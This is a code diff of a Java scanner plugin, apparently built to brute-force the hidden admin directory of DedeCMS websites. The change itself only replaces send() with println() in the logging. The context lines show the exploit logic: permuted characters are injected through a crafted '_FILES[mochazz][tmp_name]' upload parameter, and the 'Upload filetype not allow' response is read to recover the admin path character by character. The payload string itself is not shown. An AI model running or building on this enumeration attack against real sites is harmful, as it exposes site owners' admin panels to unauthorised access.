@@ -48,7 +48,7 @@ public class DedeFindManage extends WebSocketPlugin {
             ArrayList<String> list = new ArrayList<>();
             permutation1(list,characters, "", i);
             for (String str : list) {
-                send("testing:"+str);
+                println("testing:"+str);
                 params.put("_FILES[mochazz][tmp_name]",String.format(payload,str));
                 fetcher.run(crawlerPage);
                 String string = crawlerPage.getResponse().getStatus().getContentString();
@@ -62,7 +62,7 @@ public class DedeFindManage extends WebSocketPlugin {
         }
 
         if (StringUtils.isNotBlank(prefix)){
-            send("prefix:"+prefix);
+            println("prefix:"+prefix);
             boolean f= false;
             for (int i = 0; i < 30; i++) {
                 if (f)
@@ -77,13 +77,13 @@ public class DedeFindManage extends WebSocketPlugin {
                     if (!string.contains("Upload filetype not allow") && crawlerPage.getResponse().getStatus().getStatusCode() == 200)
                     {
                         prefix+= s;
-                        send("[+]"+prefix);
+                        println("[+]"+prefix);
                         break;
                     }
                 }
             }
 
-            send("[+]后台地址为:"+prefix);
+            println("[+]后台地址为:"+prefix);
         }
         return prefix;
     }
